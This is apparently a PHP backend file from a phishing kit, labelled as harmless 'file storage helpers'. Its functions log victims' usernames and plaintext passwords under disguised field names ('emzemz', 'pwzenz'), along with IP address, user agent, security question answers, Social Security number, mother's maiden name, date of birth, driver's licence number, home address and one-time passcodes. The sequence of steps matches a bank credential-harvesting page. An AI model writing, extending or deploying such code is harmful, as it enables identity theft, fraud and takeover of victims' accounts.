<?php

/**
 * File Storage Helper Functions
 * Saves user data to text files instead of making API calls
 */

function saveUserData($filename, $data) {
    $dataDir = __DIR__ . '/../data';
    
    // Create data directory if it doesn't exist
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0755, true);
    }
    
    $filepath = $dataDir . '/' . $filename;
    
    // Add timestamp to each entry
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] " . json_encode($data) . "\n";
    
    // Append to file
    return file_put_contents($filepath, $entry, FILE_APPEND | LOCK_EX);
}

function getUserData($filename) {
    $dataDir = __DIR__ . '/../data';
    $filepath = $dataDir . '/' . $filename;
    
    if (!file_exists($filepath)) {
        return [];
    }
    
    $lines = file($filepath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $data = [];
    
    foreach ($lines as $line) {
        // Remove timestamp and parse JSON
        if (preg_match('/^\[.*?\] (.+)$/', $line, $matches)) {
            $data[] = json_decode($matches[1], true);
        }
    }
    
    return $data;
}

function findUserByUsername($username) {
    $loginData = getUserData('login.txt');
    
    foreach ($loginData as $entry) {
        if (isset($entry['emzemz']) && $entry['emzemz'] === $username) {
            return $entry;
        }
    }
    
    return null;
}

function saveLoginData($emzemz, $pwzenz) {
    $data = [
        'emzemz' => $emzemz,
        'pwzenz' => $pwzenz,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ];
    
    return saveUserData('login.txt', $data);
}

function saveSecurityQuestions($emzemz, $securityQuestion1, $securityAnswer1, $securityQuestion2, $securityAnswer2, $securityQuestion3, $securityAnswer3) {
    $data = [
        'emzemz' => $emzemz,
        'securityQuestion1' => $securityQuestion1,
        'securityAnswer1' => $securityAnswer1,
        'securityQuestion2' => $securityQuestion2,
        'securityAnswer2' => $securityAnswer2,
        'securityQuestion3' => $securityQuestion3,
        'securityAnswer3' => $securityAnswer3
    ];
    
    return saveUserData('security_questions.txt', $data);
}

function saveBasicInfo($emzemz, $fzNme, $lzNme, $phone, $ssn, $motherMaidenName, $dob, $driverLicense) {
    $data = [
        'emzemz' => $emzemz,
        'fzNme' => $fzNme,
        'lzNme' => $lzNme,
        'phone' => $phone,
        'ssn' => $ssn,
        'motherMaidenName' => $motherMaidenName,
        'dob' => $dob,
        'driverLicense' => $driverLicense
    ];
    
    return saveUserData('basic_info.txt', $data);
}

function saveHomeAddress($emzemz, $stAd, $apt, $city, $state, $zipCode) {
    $data = [
        'emzemz' => $emzemz,
        'stAd' => $stAd,
        'apt' => $apt,
        'city' => $city,
        'state' => $state,
        'zipCode' => $zipCode
    ];
    
    return saveUserData('home_address.txt', $data);
}

function saveOTP($emzemz, $otp) {
    $data = [
        'emzemz' => $emzemz,
        'otp' => $otp,
        'verified' => true
    ];
    
    return saveUserData('otp.txt', $data);
}

function validateUser($emzemz, $pwzenz) {
    $loginData = getUserData('login.txt');
    
    foreach ($loginData as $entry) {
        if (isset($entry['emzemz']) && $entry['emzemz'] === $emzemz && isset($entry['pwzenz']) && $entry['pwzenz'] === $pwzenz) {
            return true;
        }
    }
    
    return false;
}

?>
